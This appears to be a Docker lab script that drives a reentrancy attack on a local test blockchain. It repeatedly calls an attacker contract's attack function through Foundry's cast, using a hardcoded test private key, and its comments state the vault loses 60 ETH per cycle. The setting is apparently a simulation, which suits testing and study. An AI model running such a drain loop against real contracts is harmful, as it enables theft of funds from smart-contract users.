#!/bin/sh

# Poll until deploy-addresses.json exists
while [ ! -f /shared/deploy-addresses.json ]; do
  echo "Waiting for /shared/deploy-addresses.json..."
  sleep 2
done

ATTACKER=$(cat /shared/deploy-addresses.json | jq -r '.Attacker')
TOKEN=$(cat /shared/deploy-addresses.json | jq -r '.MockToken')
PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

if [ "$TRIGGER_MODE" = "manual" ]; then
  echo "Attacker ready. Run manually via docker compose exec attacker-runner."
  tail -f /dev/null
else
  sleep 10
  echo "Starting drain loop on $ATTACKER..."
  while true; do
    # Re-deposit 10 tokens from attacker's own balance so we can attack again
    # (attacker starts with 100 ETH, each cycle deposits 10 and drains 70 from vault)
    cast send $ATTACKER "setupDeposit(uint256)" 10000000000000000000 \
      --private-key $PK --rpc-url $RPC_URL --quiet 2>/dev/null || true
    # Execute reentrancy: deposits 10, re-enters 6x = drains 70 from vault
    # Net: vault loses 60 ETH per cycle
    cast send $ATTACKER "attack(uint256)" 10000000000000000000 \
      --private-key $PK --rpc-url $RPC_URL --gas-limit 3000000 2>/dev/null || true
    sleep 4
  done
fi
